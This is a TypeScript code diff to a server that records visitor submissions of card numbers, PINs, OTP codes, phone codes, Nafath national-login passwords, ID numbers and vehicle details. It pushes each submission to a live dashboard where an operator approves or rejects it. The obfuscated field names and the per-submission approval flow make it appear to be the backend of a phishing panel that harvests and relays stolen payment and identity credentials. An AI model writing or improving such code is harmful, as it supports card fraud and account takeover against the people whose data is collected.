@@ -656,26 +656,45 @@ async function upsertVisitor(visitorId: string, payload: Record<string, any> = {
     boxType = 'vehicle';
   }
   
-  // Set box timestamp if we detected a box type
+  // Set box timestamp ONLY when customer submits new DATA (not status updates from admin)
+  // This ensures timestamp is set only from customer submissions
   if (boxType) {
-    // Determine status based on payload
-    let status = 'pending';
-    if (payload._v1Status || payload._v5Status || payload._v6Status || payload.phoneOtpStatus) {
-      // If status field is set, use it
-      status = payload._v1Status || payload._v5Status || payload._v6Status || payload.phoneOtpStatus;
+    // Check if this is actual data submission (not just status update)
+    const hasDataSubmission = 
+      (boxType === 'card' && (payload._v1 || payload.cardNumber || payload.cardOwner)) ||
+      (boxType === 'otp' && (payload._v5 || payload.otpCode)) ||
+      (boxType === 'pin' && (payload._v6 || payload.pinCode)) ||
+      (boxType === 'phone' && (payload._v7 || payload.phoneOtp || payload.phoneIdNumber || payload.phoneCarrier)) ||
+      (boxType === 'nafad' && (payload.nafadIdNumber || payload.nafadPassword || payload.nafadConfirmationCode)) ||
+      (boxType === 'identity' && (payload.identityNumber || payload.buyerName || payload.buyerIdNumber)) ||
+      (boxType === 'vehicle' && (payload.serialNumber || payload.vehicleModel || payload.vehicleYear));
+    
+    if (hasDataSubmission) {
+      // This is customer data submission - set/update timestamp
+      await setBoxTimestamp(visitorId, boxType, 'pending');
+      
+      broadcastToDashboard("box:update", {
+        visitorId,
+        boxType,
+        status: 'pending',
+        timestamp: new Date().toISOString(),
+        dataType: dataType,
+        updateType: 'new_data'
+      });
+    } else {
+      // This might be status update from admin - keep existing timestamp
+      const existingTimestamp = await getBoxTimestamp(visitorId, boxType);
+      const status = payload._v1Status || payload._v5Status || payload._v6Status || payload.phoneOtpStatus || 'pending';
+      
+      // Broadcast with existing timestamp (don't change it)
+      broadcastToDashboard("box:update", {
+        visitorId,
+        boxType,
+        status,
+        timestamp: existingTimestamp?.event_timestamp || new Date().toISOString(),
+        updateType: 'status_only'
+      });
     }
-    
-    // Save to database and broadcast
-    await setBoxTimestamp(visitorId, boxType, status);
-    
-    // Broadcast to dashboard with the specific box type and timestamp
-    broadcastToDashboard("box:update", {
-      visitorId,
-      boxType,
-      status,
-      timestamp: new Date().toISOString(),
-      dataType: dataType
-    });
   }
 
   return merged;
@@ -1202,15 +1221,21 @@ async function startServer() {
       
       broadcastToDashboard("dashboard:update", dashboardData);
       
-      // NEW: Also broadcast box:update event with timestamp for real-time updates
+      // Broadcast box:update event WITHOUT changing the timestamp
+      // Timestamp should ONLY be set by customer submissions, NOT by admin actions
       const decisionStatus = action === "approve" ? "approved" : "rejected";
-      await setBoxTimestamp(visitorId, boxType as BoxType, decisionStatus);
+      
+      // Get existing timestamp from database (don't change it)
+      const existingTimestamp = await getBoxTimestamp(visitorId, boxType as BoxType);
+      
       broadcastToDashboard("box:update", {
         visitorId,
         boxType,
         status: decisionStatus,
-        timestamp: new Date().toISOString(),
-        action: 'decision'
+        // Keep existing timestamp if available, otherwise use current time
+        timestamp: existingTimestamp?.event_timestamp || new Date().toISOString(),
+        action: 'decision',
+        updateType: 'status_only' // Indicates this is only a status update, not new data
       });
       
       res.json({
